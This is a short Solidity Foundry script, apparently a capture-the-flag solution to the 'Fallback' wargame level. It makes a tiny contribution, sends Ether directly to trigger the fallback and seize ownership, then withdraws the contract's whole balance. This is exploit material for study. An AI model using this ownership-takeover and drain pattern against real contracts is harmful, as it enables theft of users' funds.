// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../contracts/Fallback.sol";

contract POC is Script {
    Fallback private level1 = Fallback(payable(0x6652e3fc53D09cF29BBe6CB44d9e0B2C8E179947));

    function run() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}(); // contribute some Ether/Wei
        level1.getContribution(); // check how much my contribution is
        address(level1).call{value: 1 wei}(""); // trigger the fallback function
        level1.owner(); // query new owner
        level1.withdraw(); // withdraw all the Ether

        vm.stopBroadcast();
    }
}
